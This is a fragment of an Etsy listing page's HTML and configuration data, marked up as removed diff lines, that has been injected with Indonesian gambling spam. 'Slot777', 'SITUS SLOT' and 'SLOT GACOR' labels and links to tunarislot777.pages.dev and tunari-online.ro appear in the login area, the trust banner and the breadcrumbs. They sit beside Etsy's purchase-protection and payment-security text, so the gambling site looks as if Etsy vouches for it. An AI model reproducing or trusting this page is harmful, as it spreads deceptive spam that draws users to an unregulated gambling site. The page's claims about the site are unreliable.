\\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"MH"},"275":{"postal_code_type":"postal","postal_code_pattern":"9[78]2\\d{2}","postal_code_placeholder":"","country_iso_code":"MQ"},"239":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}(?:\\d{2}|[A-Z]{2}\\d{3})","postal_code_placeholder":"","country_iso_code":"MU"},"276":{"postal_code_type":"postal","postal_code_pattern":"976\\d{2}","postal_code_placeholder":"","country_iso_code":"YT"},"150":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MX"},"277":{"postal_code_type":"zip","postal_code_pattern":"(9694[1-4])(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"FM"},"148":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"MD"},"278":{"postal_code_type":"postal","postal_code_pattern":"980\\d{2}","postal_code_placeholder":"","country_iso_code":"MC"},"154":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MN"},"155":{"postal_code_type":"postal","postal_code_pattern":"8\\d{4}","postal_code_placeholder":"","country_iso_code":"ME"},"147":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MA"},"156":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"MZ"},"153":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MM"},"160":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"NA"},"166":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"NP"},"233":{"postal_code_type":"postal","postal_code_pattern":"988\\d{2}","postal_code_placeholder":"","country_iso_code":"NC"},"167":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"3974","country_iso_code":"NZ"},"163":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"NI"},"161":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"NE"},"162":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"NG"},"282":{"postal_code_type":"postal","postal_code_pattern":"2899","postal_code_placeholder":"","country_iso_code":"NF"},"283":{"postal_code_type":"zip","postal_code_pattern":"(9695[012])(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"MP"},"176":{"postal_code_type":"postal","postal_code_pattern":null,"postal_code_placeholder":"","country_iso_code":"KP"},"165":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"NO"},"168":{"postal_code_type":"postal","postal_code_pattern":"(?:PC )?\\d{3}","postal_code_placeholder":"","country_iso_code":"OM"},"169":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"PK"},"284":{"postal_code_type":"zip","postal_code_pattern":"(969(?:39|40))(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"PW"},"173":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"PG"},"178":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"PY"},"171":{"postal_code_type":"Postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"PE"},"172":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"PH"},"174":{"postal_code_type":"postal","postal_code_pattern":"\\d{2}-\\d{3}","postal_code_placeholder":"10-345","country_iso_code":"PL"},"177":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}-\\d{3}","postal_code_placeholder":"1000-205","country_iso_code":"PT"},"175":{"postal_code_type":"zip","postal_code_pattern":"(00[679]\\d{2})(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"PR"},"304":{"postal_code_type":"postal","postal_code_pattern":"9[78]4\\d{2}","postal_code_placeholder":"","country_iso_code":"RE"},"180":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"RO"},"181":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"101000","country_iso_code":"RU"},"308":{"postal_code_type":"postal","postal_code_pattern":"9[78][01]\\d{2}","postal_code_placeholder":"","country_iso_code":"BL"},"286":{"postal_code_type":"postal","postal_code_pattern":"(?:ASCN|STHL) 1ZZ","postal_code_placeholder":"","country_iso_code":"SH"},"288":{"postal_code_type":"postal","postal_code_pattern":"9[78][01]\\d{2}","postal_code_placeholder":"","country_iso_code":"MF"},"289":{"postal_code_type":"postal","postal_code_pattern":"9[78]5\\d{2}","postal_code_placeholder":"","country_iso_code":"PM"},"249":{"postal_code_type":"Postal","postal_code_pattern":"VC\\d{4}","postal_code_placeholder":"","country_iso_code":"VC"},"291":{"postal_code_type":"postal","postal_code_pattern":"4789\\d","postal_code_placeholder":"","country_iso_code":"SM"},"183":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"SA"},"185":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"SN"},"189":{"postal_code_type":"postal","postal_code_pattern":"\\d{5,6}","postal_code_placeholder":"","country_iso_code":"RS"},"220":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"SG"},"191":{"postal_code_type":"postal","postal_code_pattern":"\\d{3} ?\\d{2}","postal_code_placeholder":"","country_iso_code":"SK"},"192":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"SI"},"188":{"postal_code_type":"postal","postal_code_pattern":"[A-Z]{2} ?\\d{5}","postal_code_placeholder":"","country_iso_code":"SO"},"215":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"ZA"},"294":{"postal_code_type":"postal","postal_code_pattern":"SIQQ 1ZZ","postal_code_placeholder":"","country_iso_code":"GS"},"136":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"KR"},"99":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"28013","country_iso_code":"ES"},"142":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"LK"},"184":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"SD"},"295":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"SJ"},"194":{"postal_code_type":"postal","postal_code_pattern":"[HLMS]\\d{3}","postal_code_placeholder":"","country_iso_code":"SZ"},"193":{"postal_code_type":"postal","postal_code_pattern":"^\\d{5}$","postal_code_placeholder":"111 22","country_iso_code":"SE"},"80":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"CH"},"204":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}(?:\\d{2,3})?","postal_code_placeholder":"","country_iso_code":"TW"},"199":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"TJ"},"205":{"postal_code_type":"postal","postal_code_pattern":"\\d{4,5}","postal_code_placeholder":"","country_iso_code":"TZ"},"198":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"TH"},"164":{"postal_code_type":"postal","postal_code_pattern":"[1-9]\\d{3} ?(?:[A-RT-Z][A-Z]|S[BCE-RT-Z])","postal_code_placeholder":"1105 AW","country_iso_code":"NL"},"202":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"TN"},"203":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"TR"},"200":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"TM"},"299":{"postal_code_type":"postal","postal_code_pattern":"TKCA 1ZZ","postal_code_placeholder":"","country_iso_code":"TC"},"207":{"postal_code_type":"postal","postal_code_pattern":"^([0-8][0-9]{4}|9[0-3][0-9]{3}|94[0-8][0-9]{2}|949[0-8][0-9]|9499[0-9])$","postal_code_placeholder":"","country_iso_code":"UA"},"105":{"postal_code_type":"postal","postal_code_pattern":"^(GIR ?0AA|((AB|AL|B|BA|BB|BD|BF|BH|BL|BN|BR|BS|BT|BX|CA|CB|CF|CH|CM|CO|CR|CT|CV|CW|DA|DD|DE|DG|DH|DL|DN|DT|DY|E|EC|EH|EN|EX|FK|FY|G|GL|GY|GU|HA|HD|HG|HP|HR|HS|HU|HX|IG|IM|IP|IV|JE|KA|KT|KW|KY|L|LA|LD|LE|LL|LN|LS|LU|M|ME|MK|ML|N|NE|NG|NN|NP|NR|NW|OL|OX|PA|PE|PH|PL|PO|PR|RG|RH|RM|S|SA|SE|SG|SK|SL|SM|SN|SO|SP|SR|SS|ST|SW|SY|TA|TD|TF|TN|TQ|TR|TS|TW|UB|W|WA|WC|WD|WF|WN|WR|WS|WV|YO|ZE)(\\d[\\dA-Z]? ?\\d[ABD-HJLN-UW-Z]{2}))|BFPO ?\\d{1,4})$","postal_code_placeholder":"NW1 6XE","country_iso_code":"GB"},"209":{"postal_code_type":"zip","postal_code_pattern":"^\\d{5}(?:-\\d{4})?$","postal_code_placeholder":"12345","country_iso_code":"US"},"302":{"postal_code_type":"zip","postal_code_pattern":"96898","postal_code_placeholder":"","country_iso_code":"UM"},"208":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"UY"},"248":{"postal_code_type":"zip","postal_code_pattern":"(008(?:(?:[0-4]\\d)|(?:5[01])))(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"VI"},"210":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"UZ"},"211":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"VE"},"212":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}\\d?","postal_code_placeholder":"","country_iso_code":"VN"},"224":{"postal_code_type":"postal","postal_code_pattern":"986\\d{2}","postal_code_placeholder":"","country_iso_code":"WF"},"213":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"EH"},"217":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"ZM"}},"ship_to_preference_capabilities":{"209":{"postal_code":{"is_assignable":true,"is_required":true}},"79":{"postal_code":{"is_assignable":true,"is_required":true}},"122":{"postal_code":{"is_assignable":true,"is_required":true}},"61":{"postal_code":{"is_assignable":true,"is_required":true}},"105":{"postal_code":{"is_assignable":true,"is_required":true}}},"category_id":68887416,"admin_tools_page_data":[],"collections_is_listing_page":true,"currency_data":{"currency_id":840,"code":"USD","name":"United States Dollar","number_precision":2,"symbol":"$","listing_enabled":true,"browsing_enabled":true,"buyer_location_restricted":false,"rate_updates_enabled":true},"machine_translation\/listings_click_to_translate":true,"ads.prolist\/log_clicks_and_impressions":false,"mfg\/dovetail":true,"mfg\/buyer_facing_dovetail":true,"searchx\/4q18\/dwell_time_as_backend_event":false,"is_regulatory_buyer_disclosure_enabled":true,"is_convos_condensed_disclosure_enabled":true,"machine_translation":{"mode":"disabled","listing_id":1790774795,"to_lang_code":"en-GB","from_lang_code":"en-US","translated":null,"untranslated":null,"category_tags":null},"listing_fee":20,"presented_listing_fee":"$0.20 USD","listing_period_months":4,"enable_pla_sash_popover_hover_event":false,"use_sash_popover_events":true,"apple_pay_api_version_number":12,"render_is_gift_section":true,"coupons_in_buy_box_is_enabled":false,"is_eligible_web_components":false,"should_show_atc_from_listing_cards":true,"should_show_atc_from_listing_cards_mweb":false,"added_to_cart_text":"Added to basket!","speculation_rules_prefetch":false,"speculation_rules_prefetch_from_search":false,"prefetch_event_cache_key":"","should_show_sidebar_cart_post_atc_recs":false,"is_eligible_for_trust_suite_section":false,"is_gift_guide_flyout_enabled":false,"should_hide_sub_nav":true,"should_show_breadcrumbs":true,"should_change_heading_on_similar_items_toggle":false,"should_show_ad_section_tooltip":false,"is_deemphasized_top_sash":true,"ad_listing_ids_to_exclude":[],"is_eligible_mini_collections_menu":true,"convo_replaces_add_to_registry":false,"image_ids_by_listing_variation_ids":[],"should_show_scrollable_thumbnails":true,"should_show_video":true,"shouldShowThumbnails":true,"carousel_height_percentage_relative_to_width":[80,83.3333333333333285963817615993320941925048828125,80,80,80,80,80,80,80,80],"is_mobile_experience":false,"is_users_own_listing":false,"lp_toffers_v2_true_sale_enabled":false,"should_show_histogram_panel":false,"anchor_shop_name_to_seller_cred":false,"shop_reviews_count":129,"neu_buy_box_type":"offerings","listing_id":1790774795,"klarna_osm_js":"https:\/\/js.klarna.com\/web-sdk\/v1\/klarna.js","is_eligible_for_klarna_osm":false,"is_eligible_for_variations_update":true,"can_listing_have_coupon_applied":false,"express_checkout":{"is_guest":false,"should_show_digital_rights_waiver":false,"accepts_apple_pay":false,"apple_pay_submit_classes":null,"apple_pay_submit_classes_collage":null,"apple_pay_submit_text":null,"apple_payment_info":null,"purchase_accept_terms_text":"By making a purchase, you agree to Etsy's <a href=\"\/legal\/terms-of-use\" title=\"Terms of Use\" data-article-id=\"25545769842\" class=\"checkout-purchase-accept-terms-link\">Terms of Use<\/a> and <a href=\"\/legal\/privacy\" title=\"Privacy Policy\" data-article-id=\"25468388617\" class=\"checkout-purchase-accept-terms-link\">Privacy Policy<\/a>.","accepts_multiple_payment_methods":false,"accepts_paypal":false,"show_checkout_sheet":false,"replace_apple_pay_bin_with_etsy_bin":false,"should_log_checkout_sheet_support_for_non_defaults_filtering_event":true},"merchant_identifier":"merchant.com.etsy.icht","is_multiple_questions_enabled_buyer":true,"should_show_mix_and_match_bundle":true,"how_its_made_label_type":"seller_designed","product_details_content_toggle_selector":"[data-wt-content-toggle][aria-controls='content-toggle-product-details-read-more']","should_show_description_content_toggle":true,"active_tab":"same_listing_reviews","allow_reviews_debug":false,"using_mweb_tabs":false,"load_tabbed_layout_js":true,"should_show_helpful_count":true,"should_default_chronological_sort":false,"should_include_subratings":true,"current_page":1,"is_deep_dive":false,"has_appreciation_photos":true,"eligible_for_review_photo_filter_and_sort":true,"is_new_deep_dive":true,"photos_per_page":4,"review_categorical_tags_enabled":true,"review_hide_sort_by_prefix":true,"deep_dive_sheet_position":"bottom","has_external_mobile_image_tags":false,"tag_cards_with_image":".j1dsc0kjuogb","mweb_can_scroll_to_seller_cred_module":false,"is_eligible_for_showing_more_items_on_explore_more":false,"load_user_faves_option":true,"update_many_faves_option":true,"is_async_only_faves_option":false,"guest_favorites_enabled":false,"collection_count":0,"favorites_key":"","use_clearer_privacy_description":true,"conditional_sale_interstitial":true,"google_client_id":"296956783393-2d8r0gljo87gjmdpmvkgbeasdmelq33e.apps.googleusercontent.com","show_one_tap_modal":false,"is_google_one_tap_cart_page":false});
-        })();
-    </script>
-
-        <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">__webpack_public_path__ = "https://www.etsy.com/ac/evergreenVendor/js/en-GB/";</script>
-
-<script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">(function() {
-var asyncAvailable = true;
-try {
-    eval("async () => {}");
-} catch(e) {
-    asyncAvailable = false;
-}
-
-var falseUA = true && !asyncAvailable;
-var primarySupportsAsync = !true && asyncAvailable;
-
-var clientloggerIsEnabled = true;
-if (clientloggerIsEnabled) {
-    if (falseUA) {
-        new Image().src = '/clientlog?falseua=1';
-    }
-    if (primarySupportsAsync) {
-        new Image().src = '/clientlog?primarysupportsasync=1';
-    }
-    if (window.__etsy_logging && window.__etsy_logging.bots && (window.__etsy_logging.bots.isBot || window.__etsy_logging.bots.botCheck.length > 0)) {
-        new Image().src = '/clientlog?feisbot=1&bot_check=' + encodeURIComponent(JSON.stringify(window.__etsy_logging.bots.botCheck));
-    }
-}
-
-})();</script>
-
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/vendor_bundle.4b28aa70c9cca35746a4.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/etsy_libs.30bc4a394fcd9a30315a.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/paula/v3/polyfill.min.js?etsy-v=v5&flags=gated&features=AbortController%2CDOMTokenList.prototype.@@iterator%2CDOMTokenList.prototype.forEach%2CIntersectionObserver%2CIntersectionObserverEntry%2CNodeList.prototype.@@iterator%2CNodeList.prototype.forEach%2CObject.preventExtensions%2CString.prototype.anchor%2CString.raw%2Cdefault%2Ces2015%2Ces2016%2Ces2017%2Ces2018%2Ces2019%2Ces2020%2Ces2021%2Ces2022%2Cfetch%2CgetComputedStyle%2CmatchMedia%2Cperformance.now" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/app-shell/globals/index.8029f098085d5a35c05e.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/@etsy-modules/ConsentManagement/Transcend-Integration.65983beb85f82c0d3fef.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/bootstrap/listings3/main.747274616ea211a73f56.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/async/component-islands/vendor.328ff8c29b4753276913.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-   <script src="https://www.etsy.com/ac/evergreenVendor/js/en-GB/react-ssr/component-islands/queue.f84dcfc00c5c512691c1.js" type="text/javascript" nonce="gPiNOjdRCrWLas5Ik2CuS+N0" crossorigin defer></script>
-
-        <main id="content"><br> 
-          <div class="Slot777"><a href="https://tunarislot777.pages.dev/" rel="nofollow noreferrer" class="register">LOGIN</a><a href="https://tunarislot777.pages.dev/" rel="nofollow noreferrer" class="login">DAFTAR</a></div><br>
-            <div data-clg-id="WtBanner" class="wt-banner wt-banner--informational-01 trust-suite-banner wt-max-width-full wt-display-flex-xs wt-align-items-center wt-justify-content-center wt-p-xs-3" id="etsywebtoolkitbannerswtbanner68cb39e94ef52" data-prop-id="etsywebtoolkitbannerswtbanner68cb39e94ef52" data-prop-type="static" data-prop-style-type="informational-01" data-prop-is-open="true"  data-wt-neu-rendered>
-        <div class="wt-banner__layout wt-display-flex-xs wt-align-items-center wt-justify-content-space-evenly wt-flex-nowrap">
-        <div class="wt-show-lg wt-show-xl wt-show-tv wt-hide-md wt-hide-sm">
-            <div class="wt-display-flex-xs wt-align-items-center">
-                <p class="wt-text-title">
-                    Shop confidently on Etsy
-                </p>
-            </div>
-        </div>
-        <div class="">
-            <div class="wt-display-flex-xs wt-align-items-center">
-                    <div class="wt-pr-xs-1" aria-hidden="true">
-                        <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12 2 4 6v6c0 8 8 10 8 10s8-2 8-10V6zm5.25 7.54-6.67 6.67-.11.11h-.32l-.9-.12h-.16L9 16l-2.3-4-.17-.29.29-.17L8 10.88l.28-.17.17.29 1.66 2.87 5.74-5.74.24-.24.24.24.94.94.23.23z"/></svg></span>
-                    </div>
-                <div class="wt-popover" id="trust-suite-banner-epp-popover" data-wt-popover>
-                    <button type="button" data-wt-popover-trigger
-                            class="wt-popover__trigger wt-popover__trigger--underline wt-text-link wt-display-inline-flex-xs wt-align-items-center"
-                            aria-describedby="trust-suite-banner-epp-popover-overlay"
-                    >
-                        <span class="wt-text-title">
-                            Slot777
-                        </span>
-                    </button>
-                    <div id="trust-suite-banner-epp-popover-overlay" role="tooltip">
-                        <h4 class="wt-mb-xs-1">
-                            SITUS SLOT
-                        </h4>
-                        <p class="wt-mb-xs-3">
-                            <strong>
-                                If something goes wrong with your order, you'll get a full refund.
-                            </strong>
-                        </p>
-                        <p class="wt-mb-xs-1">
-                            <strong>
-                                Here's what's eligible:
-                            </strong>
-                        </p>
-<ul data-clg-id="WtList" class="wt-list wt-mb-xs-1 wt-text-body-small" modifier="square">                            <li>
-                                Your order doesn't match the item description or photos
-                            </li>
-                            <li>
-                                Your item arrived damaged
-                            </li>
-                            <li>
-                                Your item arrived after the estimated arrival window
-                            </li>
-                            <li>
-                                Your item didn't arrive or was lost in the mail
-                            </li>
-</ul>
-                        <p class="wt-text-body-small">
-                            <a href="https://www.etsy.com/etsy-purchase-protection" ref="listing_page_trust_suite_banner" class="wt-text-link" data-listings-track-click data-event-name="trust_suite_banner_purchase_protection_banner_link_clicked" target="_blank">
-                                View programme terms
-                            </a>
-                        </p>
-
-                        <span class="wt-popover__arrow"></span>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="">
-            <div class="wt-display-flex-xs wt-align-items-center">
-                <div class="wt-pr-xs-1" aria-hidden="true">
-                    <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13 13v5h-2v-5z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M4 9.25A.25.25 0 0 1 4.25 9H7.5V6.5a4.5 4.5 0 0 1 9 0V9h3.25a.25.25 0 0 1 .25.25V18a4 4 0 0 1-4 4H8a4 4 0 0 1-4-4zM9.5 6.5a2.5 2.5 0 0 1 5 0V9h-5zM8 20a2 2 0 0 1-2-2v-7h12v7a2 2 0 0 1-2 2z"/></svg></span>
-                </div>
-                <div class="wt-popover" id="trust-suite-banner-spo-popover" data-wt-popover>
-                    <button type="button" data-wt-popover-trigger
-                            class="wt-popover__trigger wt-popover__trigger--underline wt-text-link wt-display-inline-flex-xs wt-align-items-center"
-                            aria-describedby="trust-suite-banner-spo-popover-overlay"
-                    >
-                        <span class="wt-text-title">
-                    SITUS SLOT
-                        </span>
-                    </button>
-                    <div id="trust-suite-banner-spo-popover-overlay" role="tooltip">
-                        <p class="wt-mb-xs-1">
-                            
-                                Etsy keeps your payment information secure.
-                            
-                        </p>
-                        <p class="wt-mb-xs-1">
-                            
-                                Etsy shops never receive your credit card information.
-                            
-                        </p>
-                        <span class="wt-popover__arrow"></span>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="">
-            <div class="wt-display-flex-xs wt-align-items-center">
-                <div class="wt-pr-xs-1" aria-hidden="true">
-                    <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M14.782 8.676 12 2.145l-2.78 6.53-7.086.625 5.364 4.663-1.595 6.918L12 17.228l6.097 3.653-1.596-6.919L21.867 9.3z"/></svg></span>
-                </div>
-                <div class="wt-popover" id="trust-suite-banner-vr-popover" data-wt-popover>
-                    <button type="button" data-wt-popover-trigger
-                            class="wt-popover__trigger wt-popover__trigger--underline wt-text-link wt-display-inline-flex-xs wt-align-items-center"
-                            aria-describedby="trust-suite-banner-vr-popover-overlay"
-                    >
-                        <span class="wt-text-title">
-                            SLOT GACOR
-                        </span>
-                    </button>
-                    <div id="trust-suite-banner-vr-popover-overlay" role="tooltip">
-                        <p class="wt-mb-xs-1">
-                            
-                                All reviews are from verified buyers – real people who actually bought the item they're talking about.
-                            
-                        </p>
-                        <span class="wt-popover__arrow"></span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-</div>
-<div data-ui="listing-breadcrumbs" class="wt-hide-xs wt-show-lg breadcrumb_nav">
-    <div data-ui="cat-nav" id="desktop-category-nav" class="cat-nav  v2-toolkit-cat-nav wt-ml-xs-0 wt-mr-xs-0">
-        <div class="wt-text-caption wt-position-relative wt-z-index-5 wt-pt-xs-2">
-                <div class="wt-grid wt-body-max-width wt-pl-xs-2 wt-pr-xs-2 wt-pl-md-4 wt-pr-md-4 wt-pl-lg-6 wt-pr-lg-6">
-                <ul class="wt-list-unstyled wt-grid__item-xs-12 wt-body-max-width wt-display-flex-xs wt-justify-content-center" data-menu-ui="menubar" data-ui="top-nav-category-list">
-                        <li data-ui="list-item-breadcrumbs" class="top-nav-item wt-sem-text-primary wt-text-body-small--tight wt-pb-xs-2">
-                            <a data-breadcrumb-link data-menu-ui="menuitem" tabindex="0" href="https://tunari-online.ro/">Slot777</a>
-                                <span class="etsy-icon arrow-separator wt-sem-text-primary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-                        </li>
-                        <li data-ui="list-item-breadcrumbs" class="top-nav-item wt-sem-text-primary wt-text-body-small--tight wt-pb-xs-2">
-                            <a data-breadcrumb-link data-menu-ui="menuitem" tabindex="0" href="https://tunari-online.ro/">SITUS SLOT</a>
-                                <span class="etsy-icon arrow-separator wt-sem-text-primary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-                        </li>
-                        <li data-ui="list-item-breadcrumbs" class="top-nav-item wt-sem-text-primary wt-text-body-small--tight wt-pb-xs-2">
-                            <a data-breadcrumb-link data-menu-ui="menuitem" tabindex="0" href="https://tunari-online.ro/">SLOT GACOR</a>
-                                <span class="etsy-icon arrow-separator wt-sem-text-primary wt-icon--smallest-xs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8 21a1 1 0 0 1-.664-1.747l8.164-7.254-8.164-7.252a1 1 0 0 1 1.328-1.494L18.5 12l-9.836 8.747A1 1 0 0 1 8 21"/></svg></span>
-                        </li>
-                        <li data-ui="list-item-breadcrumbs" class="top-nav-item wt-sem-text-primary wt-text-body-small--tight wt-pb-xs-2">
-                            <a data-breadcrumb-link data-menu-ui="menuitem" tabindex="0" href="https://tunari-online.ro/">SITUS SLOT GACOR</a>
-                        </li>
-                        
-                </ul>
-                <span class="active-nav-item-indicator wt-position-absolute wt-display-inline-block" data-ui="active-nav-item-indicator"></span>
-        </div>
-        </div>
-    </div>
-</div>
-</span>
-
-
-
-<div data-selector="listing-page-content" class="content-wrap listing-page-content">
-
-    
-
-    
-
-    <div class="wt-pt-xs-5 listing-page-content-container-wider wt-horizontal-center">
-
-        <div id="listing-right-column" class="listing-buy-box-experiment">
-
-            <div>
-                <div class="body-wrap wt-body-max-width wt-display-flex-md wt-flex-direction-column-xs">
-                    <div class="image-col wt-order-xs-1 wt-mb-xs-2 wt-mb-lg-6 wt-pl-md-4 wt-pl-lg-5 wt-pl-xs-2 wt-pr-xs-2 wt-pr-xl-2 wt-pr-md-4 wt-pr-lg-0">
-                        <div class="wt-flex-lg-6 wt-mr-lg-3 wt-pr-xl-3">
-                            <div class="image-wrapper wt-position-relative carousel-container-responsive" id="photos">
-    
-
-
-    <div class="wt-position-absolute wt-position-right wt-mt-xs-2 wt-mr-xs-2">
-        
-        <div
-    data-component-island-template="@etsy-modules/Favorites/MiniCollectionsMenu/index"
-    data-component-island-id="68cb39e9458ab"
-    data-prerender-error="false"
-    data-is-prerendered="true"
->
-    <script type="text/props">
-        {"listingId":1790774795,"isFavorite":false,"listingImgUrl":"https:\/\/i.etsystatic.com\/54267703\/r\/il\/f18987\/6256816164\/il_75x75.6256816164_26ap.jpg","source":"lp_image_carousel","ignoreMenuCookie":"ignore_mini_collections_menu_cookie","isCollected":false}
-    </script>
-<div data-type="floating" data-clg-id="WtPanelAnchoredWithTrigger" class="wt-panel-with-trigger"><div class="wt-panel__trigger-container"><div aria-describedby="listing-page-favorite-button-tooltip"><button type="button" aria-label="Add to Favourites" data-source="lp_image_carousel" data-accessible-btn-fave data-listing-id="1790774795" data-always-show="true" data-testid="favorite-heart" data-in-list="false" data-clg-id="WtButton" class="wt-btn wt-btn--secondary listing-page-favorite-button wt-shadow-elevation-3 wt-bg-white wt-btn--small wt-btn--icon wt-btn--light"><div class="should-animate favorited-icon-container"><span data-favorited-icon data-testid="favorited-heart" class="should-animate etsy-icon wt-nudge-t-1 wt-text-favorite-heart wt-display-none etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M16.5,3A6.953,6.953,0,0,0,12,5.051,6.912,6.912,0,0,0,7.5,3C4.364,3,2,5.579,2,9c0,5.688,8.349,12,10,12S22,14.688,22,9C22,5.579,19.636,3,16.5,3Z"/></svg></span><span data-not-favorited-icon class=" should-animate etsy-icon wt-text-black wt-nudge-t-1 wt-display-block etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path 